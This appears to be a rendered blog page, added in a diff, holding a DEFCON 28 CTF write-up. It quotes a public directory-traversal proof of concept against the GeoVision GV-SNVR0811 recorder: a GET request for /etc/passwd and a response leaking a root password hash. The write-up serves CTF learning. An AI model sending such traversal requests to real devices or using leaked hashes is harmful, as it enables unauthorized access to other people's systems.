@@ -1,0 +1,36 @@
+<!doctype html><html lang=en><meta charset=utf-8><meta name=generator content="Hugo 0.74.3"><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><meta name=color-scheme content="light dark"><meta name=supported-color-schemes content="light dark"><title>GeoVision Flag&nbsp;&ndash;&nbsp;weslack</title><link rel=stylesheet href=/css/core.min.be501171008d95a30f958daa62c92e4cf1c096f8eb655590a575c3934e35a2ff1f22631f406912aa455f8417fd84bacb.css integrity=sha384-vlARcQCNlaMPlY2qYskuTPHAlvjrZVWQpXXDk041ov8fImMfQGkSqkVfhBf9hLrL><meta name=twitter:card content="summary"><meta name=twitter:title content="GeoVision Flag"><body><section id=header><div class="header wrap"><span class="header left-side"><a class="site home" href=/><img class="site logo" src=/logo.png alt><span class="site name">weslack</span></a></span>
+<span class="header right-side"><div class="nav wrap"><nav class=nav><a class="nav item" href=/categories/>Categories</a><a class="nav item" href=/tags/>Tags</a><a class="nav item" href=/about/>About</a><a class="nav item" href=https://github%2ecom/weslack target=_blank>GitHub</a></nav></div></span></div><div class="site slogan"><span class=title>DEFCON 28 CTF Fun</span></div></section><section id=content><div class=article-container><section class="article header"><h1 class="article title">GeoVision Flag</h1><p class="article date">Fri, 07 Aug 2020 23:33:44</p></section><article class="article markdown-body"><p>Doing a search of GeoVision GV-SNVR0811 + exploit in Google netted us with a ton of results with the following exploit.</p><p><a href=https://www.exploit-db.com/exploits/45065 target=_blank>https://www.exploit-db.com/exploits/45065</a></p><h1 id=exploit>Exploit</h1><div class=highlight><pre class=chroma><code class=language-txt data-lang=txt># Exploit Title: GeoVision GV-SNVR0811 Directory Traversal
+# Exploit Author: Berk Dusunur
+# Google Dork: N/A
+# Type: Hardware
+# Date: 2018-07-21
+# Vendor Homepage: http://www.geovision.com.tw/product/GV-SNVR0811
+# Software Link: http://www.geovision.com.tw/product/GV-SNVR0811
+# Affected Version: N/A
+# Tested on: Parrot OS
+# CVE : N/A
+
+
+# Proof Of Concept
+
+GET Request
+
+GET ../../../../../../../../../../../../etc/passwd HTTP/1.1
+Host: target
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0)
+Gecko/20100101 Firefox/61.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+Response
+
+HTTP/1.1 200 OK
+Server:Cross Web Server
+Content-length: 59
+Content-type: application/octet-stream
+
+root:$1$$qRPK7m23GJusamGpoGLby/:0:0::/root:/bin/sh
+</code></pre></div><h2 id=using-this-exploit>Using this exploit</h2><p>We put this exploit into postman, with the header configuration. We ran the request, and got the root hash.</p></article><section class="article labels"><a class=category href=/categories/sohoplessly-broken/>SOHOplessly Broken</a><a class=tag href=/tags/known-exploit/>known exploit</a><a class=tag href=/tags/easy/>easy</a></section></div><div class="article bottom"><section class="article navigation"><p><a class=link href=/post/nuuo-flag/><span class="iconfont icon-article"></span>Nuuo NVR Mini Flag</a></p></section></div></section><section id=footer><div class=footer-wrap><p class=copyright>All content is free, unencumbered, and released into the public domain. Do with it what you want. <a href=/LICENSE.txt>Unlicense</a></p><p class=powerby><span>Powered&nbsp;by&nbsp;</span><a href=https://gohugo.io target=_blank>Hugo</a><span>&nbsp;&&nbsp;</span><a href=https://themes.gohugo.io/hugo-notepadium/ target=_blank>Notepadium</a></p></div></section></body></html>
